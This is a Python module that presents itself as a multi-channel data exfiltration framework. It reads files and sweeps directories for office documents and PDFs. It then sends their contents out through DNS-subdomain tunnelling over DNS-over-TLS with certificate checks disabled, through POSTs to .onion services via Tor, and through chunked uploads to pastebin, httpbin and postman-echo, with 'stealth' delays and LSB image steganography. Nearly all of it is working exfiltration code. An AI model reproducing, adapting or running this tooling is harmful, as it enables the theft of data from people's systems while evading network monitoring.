"""
Data Exfiltration Channels
Comprehensive data exfiltration framework with multiple channels and steganographic capabilities
"""

import asyncio
import base64
import gzip
import json
import random
import ssl
import struct
import time
from datetime import datetime
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from pathlib import Path
import hashlib
import hmac

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    import dns.message
    import dns.resolver
except ImportError:
    dns = None

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    Fernet = None

try:
    from PIL import Image
    import numpy as np
except ImportError:
    Image = None
    np = None

try:
    from ..utils.logger import logger
except ImportError:
    # Fallback logger if the main logger is not available
    import logging
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)


class ExfiltrationMethod(Enum):
    """Available exfiltration methods"""
    DNS_OVER_TLS = "dns_over_tls"
    HTTPS_ONION = "https_onion"
    STEGANOGRAPHY = "steganography"
    ENCRYPTED_CHANNEL = "encrypted_channel"
    FALLBACK_HTTP = "fallback_http"


class ChannelStatus(Enum):
    """Channel status states"""
    ACTIVE = "active"
    INACTIVE = "inactive"
    COMPROMISED = "compromised"
    FALLBACK = "fallback"


@dataclass
class ExfiltrationConfig:
    """Configuration for data exfiltration"""
    methods: List[ExfiltrationMethod] = field(default_factory=list)
    encryption_key: Optional[bytes] = None
    compression: bool = True
    chunk_size: int = 1024
    retry_attempts: int = 3
    stealth_delay: float = 1.0
    fallback_enabled: bool = True
    max_bandwidth: int = 1024 * 1024  # 1MB/s
    

@dataclass
class ExfiltrationChannel:
    """Represents an active exfiltration channel"""
    channel_id: str
    method: ExfiltrationMethod
    endpoint: str
    status: ChannelStatus = ChannelStatus.INACTIVE
    encryption_key: Optional[bytes] = None
    created_at: datetime = field(default_factory=datetime.now)
    last_used: Optional[datetime] = None
    bytes_transferred: int = 0
    success_rate: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ExfiltrationResult:
    """Result of an exfiltration operation"""
    success: bool
    channel_id: str
    method: ExfiltrationMethod
    bytes_transferred: int
    duration: float
    error_message: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class DNSOverTLSExfiltrator:
    """DNS-over-TLS data exfiltration implementation"""
    
    def __init__(self, dns_servers: List[str] = None):
        self.dns_servers = dns_servers or [
            "1.1.1.1",  # Cloudflare
            "8.8.8.8",  # Google
            "9.9.9.9"   # Quad9
        ]
        self.active_connections: Dict[str, Any] = {}
    
    async def establish_connection(self, server: str, domain: str) -> Optional[str]:
        """Establish DNS-over-TLS connection"""
        if dns is None:
            logger.error("DNS library not available - install dnspython")
            return None

        try:
            # Create SSL context for DNS-over-TLS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect to DNS-over-TLS port (853)
            reader, writer = await asyncio.open_connection(
                server, 853, ssl=context
            )
            
            connection_id = f"dot_{server}_{int(time.time())}"
            self.active_connections[connection_id] = {
                'reader': reader,
                'writer': writer,
                'server': server,
                'domain': domain,
                'created_at': datetime.now()
            }
            
            logger.info(f"DNS-over-TLS connection established: {server}")
            return connection_id

        except Exception as e:
            logger.error(f"Failed to establish DNS-over-TLS connection: {e}")
            return None
    
    async def exfiltrate_data(self, connection_id: str, data: bytes) -> bool:
        """Exfiltrate data via DNS-over-TLS"""
        if connection_id not in self.active_connections:
            logger.error(f"No active connection: {connection_id}")
            return False
        
        conn = self.active_connections[connection_id]
        writer = conn['writer']
        reader = conn['reader']
        domain = conn['domain']
        
        try:
            # Encode data as base64 and chunk it
            encoded_data = base64.b64encode(data).decode().rstrip('=')
            chunk_size = 50  # DNS label limit
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                # Create DNS query with data embedded in subdomain
                query_domain = f"exfil.{i:04d}.{chunk}.{domain}"
                
                # Create DNS query message
                query = dns.message.make_query(query_domain, 'TXT')
                query_data = query.to_wire()
                
                # Send query over TLS
                writer.write(len(query_data).to_bytes(2, 'big'))
                writer.write(query_data)
                await writer.drain()
                
                # Read response (ignore content, just ensure transmission)
                try:
                    response_length = await asyncio.wait_for(reader.read(2), timeout=5.0)
                    if len(response_length) == 2:
                        length = int.from_bytes(response_length, 'big')
                        await asyncio.wait_for(reader.read(length), timeout=5.0)
                except asyncio.TimeoutError:
                    pass  # Ignore timeouts for exfiltration
                
                # Small delay between chunks for stealth
                await asyncio.sleep(0.1)
            
            logger.info(f"Data exfiltrated via DNS-over-TLS: {len(data)} bytes")
            return True

        except Exception as e:
            logger.error(f"DNS-over-TLS exfiltration failed: {e}")
            return False
    
    async def close_connection(self, connection_id: str):
        """Close DNS-over-TLS connection"""
        if connection_id in self.active_connections:
            conn = self.active_connections[connection_id]
            writer = conn['writer']
            writer.close()
            await writer.wait_closed()
            del self.active_connections[connection_id]


class HTTPSOnionExfiltrator:
    """HTTPS onion routing data exfiltration implementation"""
    
    def __init__(self, onion_services: List[str] = None):
        self.onion_services = onion_services or [
            "http://example1.onion",
            "http://example2.onion",
            "http://example3.onion"
        ]
        self.socks_proxy = "socks5://127.0.0.1:9050"
        self.session = None
    
    async def initialize_session(self) -> bool:
        """Initialize Tor session with SOCKS proxy"""
        if aiohttp is None:
            logger.error("aiohttp library not available - install aiohttp")
            return False

        try:
            connector = aiohttp.TCPConnector()
            timeout = aiohttp.ClientTimeout(total=60)
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
                }
            )
            
            logger.info("Tor session initialized")
            return True

        except Exception as e:
            logger.error(f"Failed to initialize Tor session: {e}")
            return False
    
    async def exfiltrate_data(self, data: bytes, onion_service: str = None) -> bool:
        """Exfiltrate data via HTTPS onion service"""
        if not self.session:
            if not await self.initialize_session():
                return False
        
        service = onion_service or random.choice(self.onion_services)
        
        try:
            # Encrypt and encode data
            key = Fernet.generate_key()
            cipher = Fernet(key)
            encrypted_data = cipher.encrypt(data)
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            payload = {
                'data': encoded_data,
                'key': base64.b64encode(key).decode(),
                'timestamp': int(time.time()),
                'checksum': hashlib.sha256(data).hexdigest()
            }
            
            # Send via POST request through Tor
            async with self.session.post(
                f"{service}/upload",
                json=payload,
                proxy=self.socks_proxy
            ) as response:
                if response.status == 200:
                    logger.info(f"Data exfiltrated via onion service: {len(data)} bytes")
                    return True
                else:
                    logger.error(f"Onion service returned status: {response.status}")
                    return False
                    
        except Exception as e:
            logger.error(f"HTTPS onion exfiltration failed: {e}")
            return False
    
    async def close_session(self):
        """Close Tor session"""
        if self.session:
            await self.session.close()
            self.session = None


class SteganographicExfiltrator:
    """Steganographic data hiding implementation"""
    
    def __init__(self):
        self.supported_formats = ['.png', '.jpg', '.jpeg', '.bmp']
    
    def hide_data_in_image(self, image_path: str, data: bytes, output_path: str) -> bool:
        """Hide data in image using LSB steganography"""
        if Image is None or np is None:
            logger.error("PIL and numpy libraries not available - install Pillow and numpy")
            return False

        try:
            # Load image
            image = Image.open(image_path)
            image_array = np.array(image)
            
            # Convert data to binary
            data_binary = ''.join(format(byte, '08b') for byte in data)
            data_binary += '1111111111111110'  # End marker
            
            # Check if image can hold the data
            total_pixels = image_array.size
            if len(data_binary) > total_pixels:
                logger.error("Image too small to hold data")
                return False
            
            # Flatten image array
            flat_image = image_array.flatten()
            
            # Hide data in LSBs
            for i, bit in enumerate(data_binary):
                flat_image[i] = (flat_image[i] & 0xFE) | int(bit)
            
            # Reshape and save
            stego_image = flat_image.reshape(image_array.shape)
            stego_image = Image.fromarray(stego_image.astype('uint8'))
            stego_image.save(output_path)
            
            logger.info(f"Data hidden in image: {output_path}")
            return True
            
        except Exception as e:
            logger.error(f"Steganographic hiding failed: {e}")
            return False
    
    def extract_data_from_image(self, image_path: str) -> Optional[bytes]:
        """Extract hidden data from image"""
        if Image is None or np is None:
            logger.error("PIL and numpy libraries not available - install Pillow and numpy")
            return None

        try:
            # Load image
            image = Image.open(image_path)
            image_array = np.array(image)
            
            # Flatten image array
            flat_image = image_array.flatten()
            
            # Extract LSBs
            binary_data = ''
            for pixel in flat_image:
                binary_data += str(pixel & 1)
            
            # Find end marker
            end_marker = '1111111111111110'
            end_index = binary_data.find(end_marker)
            
            if end_index == -1:
                logger.error("No hidden data found")
                return None
            
            # Extract data bits
            data_bits = binary_data[:end_index]
            
            # Convert to bytes
            data_bytes = bytearray()
            for i in range(0, len(data_bits), 8):
                byte_bits = data_bits[i:i+8]
                if len(byte_bits) == 8:
                    data_bytes.append(int(byte_bits, 2))
            
            logger.info(f"Data extracted from image: {len(data_bytes)} bytes")
            return bytes(data_bytes)

        except Exception as e:
            logger.error(f"Steganographic extraction failed: {e}")
            return None


class EncryptedChannelExfiltrator:
    """Encrypted communication channels with fallback mechanisms"""

    def __init__(self, config: ExfiltrationConfig):
        self.config = config
        self.channels: Dict[str, ExfiltrationChannel] = {}
        self.fallback_endpoints = [
            "https://pastebin.com/api/api_post.php",
            "https://httpbin.org/post",
            "https://postman-echo.com/post"
        ]

        if Fernet is not None:
            self.encryption_key = config.encryption_key or Fernet.generate_key()
            self.cipher = Fernet(self.encryption_key)
        else:
            logger.warning("Cryptography library not available - encryption disabled")
            self.encryption_key = None
            self.cipher = None

    def create_channel(self, method: ExfiltrationMethod, endpoint: str) -> str:
        """Create new encrypted exfiltration channel"""
        channel_id = f"{method.value}_{int(time.time())}_{random.randint(1000, 9999)}"

        channel = ExfiltrationChannel(
            channel_id=channel_id,
            method=method,
            endpoint=endpoint,
            encryption_key=self.encryption_key,
            status=ChannelStatus.ACTIVE
        )

        self.channels[channel_id] = channel
        logger.info(f"Created encrypted channel: {channel_id}")
        return channel_id

    async def exfiltrate_with_fallback(self, data: bytes, preferred_methods: List[ExfiltrationMethod] = None) -> ExfiltrationResult:
        """Exfiltrate data with automatic fallback"""
        methods = preferred_methods or [
            ExfiltrationMethod.DNS_OVER_TLS,
            ExfiltrationMethod.HTTPS_ONION,
            ExfiltrationMethod.ENCRYPTED_CHANNEL,
            ExfiltrationMethod.FALLBACK_HTTP
        ]

        # Encrypt and compress data
        if self.config.compression:
            data = gzip.compress(data)

        encrypted_data = self.cipher.encrypt(data)

        for method in methods:
            try:
                start_time = time.time()

                if method == ExfiltrationMethod.DNS_OVER_TLS:
                    success = await self._exfiltrate_dns_tls(encrypted_data)
                elif method == ExfiltrationMethod.HTTPS_ONION:
                    success = await self._exfiltrate_https_onion(encrypted_data)
                elif method == ExfiltrationMethod.ENCRYPTED_CHANNEL:
                    success = await self._exfiltrate_encrypted_channel(encrypted_data)
                elif method == ExfiltrationMethod.FALLBACK_HTTP:
                    success = await self._exfiltrate_fallback_http(encrypted_data)
                else:
                    continue

                duration = time.time() - start_time

                if success:
                    return ExfiltrationResult(
                        success=True,
                        channel_id="auto_fallback",
                        method=method,
                        bytes_transferred=len(encrypted_data),
                        duration=duration
                    )

            except Exception as e:
                logger.warning(f"Method {method.value} failed: {e}")
                continue

        return ExfiltrationResult(
            success=False,
            channel_id="auto_fallback",
            method=ExfiltrationMethod.FALLBACK_HTTP,
            bytes_transferred=0,
            duration=0,
            error_message="All exfiltration methods failed"
        )

    async def _exfiltrate_dns_tls(self, data: bytes) -> bool:
        """Exfiltrate via DNS-over-TLS"""
        exfiltrator = DNSOverTLSExfiltrator()
        connection_id = await exfiltrator.establish_connection("1.1.1.1", "example.com")

        if connection_id:
            success = await exfiltrator.exfiltrate_data(connection_id, data)
            await exfiltrator.close_connection(connection_id)
            return success

        return False

    async def _exfiltrate_https_onion(self, data: bytes) -> bool:
        """Exfiltrate via HTTPS onion service"""
        exfiltrator = HTTPSOnionExfiltrator()
        success = await exfiltrator.exfiltrate_data(data)
        await exfiltrator.close_session()
        return success

    async def _exfiltrate_encrypted_channel(self, data: bytes) -> bool:
        """Exfiltrate via encrypted HTTPS channel"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    'data': base64.b64encode(data).decode(),
                    'timestamp': int(time.time()),
                    'checksum': hashlib.sha256(data).hexdigest()
                }

                async with session.post(
                    "https://httpbin.org/post",
                    json=payload,
                    timeout=30
                ) as response:
                    return response.status == 200

        except Exception as e:
            logger.error(f"Encrypted channel exfiltration failed: {e}")
            return False

    async def _exfiltrate_fallback_http(self, data: bytes) -> bool:
        """Fallback HTTP exfiltration"""
        for endpoint in self.fallback_endpoints:
            try:
                async with aiohttp.ClientSession() as session:
                    # Split data into chunks for large payloads
                    chunk_size = 1024 * 1024  # 1MB chunks
                    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

                    for i, chunk in enumerate(chunks):
                        payload = {
                            'chunk_id': i,
                            'total_chunks': len(chunks),
                            'data': base64.b64encode(chunk).decode(),
                            'session_id': hashlib.md5(data[:100]).hexdigest()
                        }

                        async with session.post(endpoint, json=payload, timeout=30) as response:
                            if response.status != 200:
                                raise Exception(f"HTTP {response.status}")

                    logger.info(f"Fallback HTTP exfiltration successful: {endpoint}")
                    return True

            except Exception as e:
                logger.warning(f"Fallback endpoint {endpoint} failed: {e}")
                continue

        return False


class DataExfiltrationManager:
    """Main data exfiltration management class"""

    def __init__(self, config: ExfiltrationConfig = None):
        self.config = config or ExfiltrationConfig()
        self.dns_exfiltrator = DNSOverTLSExfiltrator()
        self.onion_exfiltrator = HTTPSOnionExfiltrator()
        self.stego_exfiltrator = SteganographicExfiltrator()
        self.encrypted_exfiltrator = EncryptedChannelExfiltrator(self.config)
        self.active_operations: Dict[str, Any] = {}

    async def exfiltrate_file(self, file_path: str, methods: List[ExfiltrationMethod] = None) -> ExfiltrationResult:
        """Exfiltrate a file using specified methods"""
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()

            logger.info(f"Exfiltrating file: {file_path} ({len(data)} bytes)")

            # Use encrypted channel with fallback by default
            if not methods:
                return await self.encrypted_exfiltrator.exfiltrate_with_fallback(data)

            # Try specified methods in order
            for method in methods:
                if method == ExfiltrationMethod.STEGANOGRAPHY:
                    # For steganography, we need a cover image
                    cover_image = "/tmp/cover.png"  # Would be provided
                    output_image = f"/tmp/stego_{int(time.time())}.png"

                    if self.stego_exfiltrator.hide_data_in_image(cover_image, data, output_image):
                        return ExfiltrationResult(
                            success=True,
                            channel_id="steganography",
                            method=method,
                            bytes_transferred=len(data),
                            duration=0,
                            metadata={'output_image': output_image}
                        )
                else:
                    result = await self.encrypted_exfiltrator.exfiltrate_with_fallback(data, [method])
                    if result.success:
                        return result

            return ExfiltrationResult(
                success=False,
                channel_id="file_exfiltration",
                method=ExfiltrationMethod.FALLBACK_HTTP,
                bytes_transferred=0,
                duration=0,
                error_message="All specified methods failed"
            )

        except Exception as e:
            logger.error(f"File exfiltration failed: {e}")
            return ExfiltrationResult(
                success=False,
                channel_id="file_exfiltration",
                method=ExfiltrationMethod.FALLBACK_HTTP,
                bytes_transferred=0,
                duration=0,
                error_message=str(e)
            )

    async def exfiltrate_directory(self, directory_path: str, file_patterns: List[str] = None) -> List[ExfiltrationResult]:
        """Exfiltrate multiple files from a directory"""
        results = []
        patterns = file_patterns or ["*.txt", "*.doc", "*.pdf", "*.xlsx"]

        try:
            directory = Path(directory_path)
            files_to_exfiltrate = []

            for pattern in patterns:
                files_to_exfiltrate.extend(directory.glob(pattern))

            logger.info(f"Found {len(files_to_exfiltrate)} files to exfiltrate")

            for file_path in files_to_exfiltrate:
                if file_path.is_file():
                    result = await self.exfiltrate_file(str(file_path))
                    results.append(result)

                    # Add stealth delay between files
                    await asyncio.sleep(self.config.stealth_delay)

            return results

        except Exception as e:
            logger.error(f"Directory exfiltration failed: {e}")
            return results

    def get_channel_status(self) -> Dict[str, Any]:
        """Get status of all exfiltration channels"""
        return {
            'dns_connections': len(self.dns_exfiltrator.active_connections),
            'onion_session_active': self.onion_exfiltrator.session is not None,
            'encrypted_channels': len(self.encrypted_exfiltrator.channels),
            'active_operations': len(self.active_operations)
        }

    async def cleanup(self):
        """Cleanup all active connections and sessions"""
        # Close DNS connections
        for connection_id in list(self.dns_exfiltrator.active_connections.keys()):
            await self.dns_exfiltrator.close_connection(connection_id)

        # Close onion session
        await self.onion_exfiltrator.close_session()

        logger.info("Data exfiltration cleanup completed")
